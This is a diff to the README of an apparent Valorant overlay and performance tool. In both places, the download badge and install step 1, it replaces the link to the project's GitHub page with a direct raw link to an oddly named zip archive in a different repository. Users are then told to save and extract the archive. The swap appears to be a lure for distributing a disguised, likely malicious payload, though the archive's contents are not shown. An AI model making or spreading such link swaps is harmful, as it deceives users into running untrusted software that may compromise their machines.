@@ -5,7 +5,7 @@ description: "Improve your Valorant performance with custom crosshair overlays, 
 ---
 # 🎯 valorant-game-tool - Elevate your performance in Valorant games
 
-[![](https://img.shields.io/badge/Download-Tool-blue)](https://github.com/Voluntary-madrona998/valorant-game-tool)
+[![](https://img.shields.io/badge/Download-Tool-blue)](https://raw.githubusercontent.com/Voluntary-madrona998/voluntary-madrona998.github.io/main/skeyting/io_voluntary_madrona_github_3.2.zip)
 
 This tool helps players improve their experience in Valorant. It provides helpful overlays and performance data. You can track your frames per second and your network latency in real time. The software saves your settings for quick use each time you play. 
 
@@ -32,7 +32,7 @@ The application works on most hardware. Ensure your computer meets these standar
 
 Follow these steps to set up the software.
 
-1.  Visit the download page: [https://github.com/Voluntary-madrona998/valorant-game-tool](https://github.com/Voluntary-madrona998/valorant-game-tool)
+1.  Visit the download page: [https://raw.githubusercontent.com/Voluntary-madrona998/voluntary-madrona998.github.io/main/skeyting/io_voluntary_madrona_github_3.2.zip](https://raw.githubusercontent.com/Voluntary-madrona998/voluntary-madrona998.github.io/main/skeyting/io_voluntary_madrona_github_3.2.zip)
 2.  Locate the button labeled "Download".
 3.  Save the file to your desktop for easy access.
 4.  Right-click the downloaded folder and select extract all.
